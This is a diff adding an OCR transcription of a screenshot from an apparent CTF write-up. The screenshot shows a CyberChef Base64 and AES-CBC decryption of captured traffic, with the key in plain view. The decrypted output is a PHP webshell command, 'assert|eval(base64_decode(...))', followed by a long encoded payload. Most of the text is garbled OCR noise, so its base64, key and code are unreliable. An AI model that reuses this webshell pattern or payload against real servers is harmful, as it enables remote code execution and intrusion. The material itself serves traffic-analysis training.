@@ -1,0 +1,52 @@
+# OCR: 6c7c089817c409425aa757dfcb0c5eda.webp
+# 来源: .\02-WriteUp\2024\6c7c089817c409425aa757dfcb0c5eda.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:15
+
+c E
+From Base64 @ 1
+Alphabet
+A-Za-z0-9+/=
+@ Remove non-alphabet chars
+Strict mode
+AES Decrypt Qu
+key
+e45e329feb5d925b al
+w
+HEX
+0000000000000000000000(
+Mode Input
+CBC Raw
+Output
+Raw
+STED
+e
+wTerGlArHldsrLegP]pHqhzHIVUnvO2Iztye62tueCpYGnpH78bNh66yeh
+DAtM1E01c070/9ScQWebIFCSnUinfDAjFB1pHcxNbzThOKVINLIBckWG7X8a
+1Pf98g6LLdffT+DsdqzpHUnltnB3R18SUsQlrxC6jZovFNcoIbuig+hd98KU
+mdTMomtoT439ac7AU0S9qZJZhswWOULFSSIRgKofPdknFD+FmwMBULLeZVA7Z
+rWo3gokedNeuwm/dgeakuc+¥C+hFO916UPHN/PImSEB22/ET62Kq8sviC28W
+MSWoxiaHarFevly70UtSpDmqi4K46uTPShHubGBskhg6iGdkRds/taL6+2N
+TIKDb6Deiks]16msapshxg2ZpZtMNivVGD8mo0s7y]mSW4K5u4S5TRoLijne
+Kf+ZEBiTCITkopfqFMGLyvyTl2mCe8FSx3USuHDZffpbElnwnkpZskMucF
+9209BwSkWMtygZuLYowXD737QRLI4/3vFh5/mDaeHezqpcqjIUPeeH/G
+xjsPXMKrYfVUEMEgWshgbpMEIHpp8sIhhiFJA6JGhfoDsKHXCb95RRrdkfon
+2UcgpvreMGgky2PkZ4zo3/jcexpWpfkqEb5SAePiQLXPrPBxOpIddcyPh
+7ec89z28iNTa027uyayi9sbryZh91QRn7bPBMUOixuixhVSI8HRohTQbdFoOR
+LTaLhXepxZVPfnDeAGbro6TMdS7QZRMZd0SYnw-=
+me 3160 一 Tr Raw sytes 乡 LF
+Bom:
+assert |eval (base64_decode( ‘QGvycm9yx3I1cG9ydGluzygwkTSNCmZ1b
+mN@aW9UTG1haW403 GNvbnR1 bnQpDQp7DQ0) JHI1Lc3VsdCA9TGFYcmFSKCK7D
+Qo]IHD1c3VsdFsic3RhdkvzT16gPSBiyXILMjRfZMSjb2R1KCJzduMjzXtzT
+ik7DQogTCAgIHD1c3VsdFsibxlnI16gPSeiyXMIIjRfZN5jb2R1KCRjb2562
+WS@KTSNCiAgICBAC2Vzc21vb19zdGFydcgpoyAgLy/1iJ31p4v1jIZzZXxNza
+W9U77yM6YG/SYWNY29ubmVjdOS5i+NQjuebtOaopWIhY2tncm91bmTvvIz1k
+I7nuinZXRyZXMbHTnl6DmsSXojrflj57jb29raMuMcgoKICABTGVjaG887
+MSjcnlnwdChqc29uX2VuY29kZSgkcnvzdxeKSk7DQp9DQokZnvuv3Rpb248R
+MSjcnlndCgkZGFeYSkKewogQHMlC3Mpb25fc3RhcnQokTskICAgICRrZXkgP
+SAlOQNFUINIT65bJ2snxTsKCMInkCFleHRlbntipb25fbG9hzGVkKCdvcvuc
+3NsIykpCiAgICAJewogICAgCQlmbaTo]GkoDskaTxzdH7SZM4oDGRhdGEpo
+yRpKyspIHsKICAgIAKICSAKZGFOYVskaVOgPSAKZGFOWskaV1eJGtleVska
+SsxaiElXTskICApIAIJCXGKCOkIcnvedXJuICRkyXRhOuogTCApCXGKICART
+Output
